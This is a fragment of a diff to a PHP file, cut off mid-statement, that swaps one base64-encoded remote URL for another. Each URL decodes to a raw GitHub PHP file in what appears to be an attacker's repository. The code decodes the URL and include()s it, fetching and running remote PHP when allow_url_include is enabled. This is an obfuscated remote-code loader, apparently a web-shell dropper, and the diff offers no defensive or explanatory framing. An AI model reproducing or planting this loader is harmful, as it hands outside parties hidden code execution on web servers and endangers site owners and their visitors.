@@ -1,5 +1,5 @@
 <?php
-$u=base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2IzbDEzdjN4NjY2L2JsZXNzZWQvcmVmcy9oZWFkcy9tYWluLzUwMy5waHA=");
+$u=base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2IzbDEzdjN4NjY2L2JsZXNzZWQvcmVmcy9oZWFkcy9tYWluL1RoZUcuTy5BLlQucGhw");
 if(ini_get('allow_url_include')){
     include($u);
 }else{
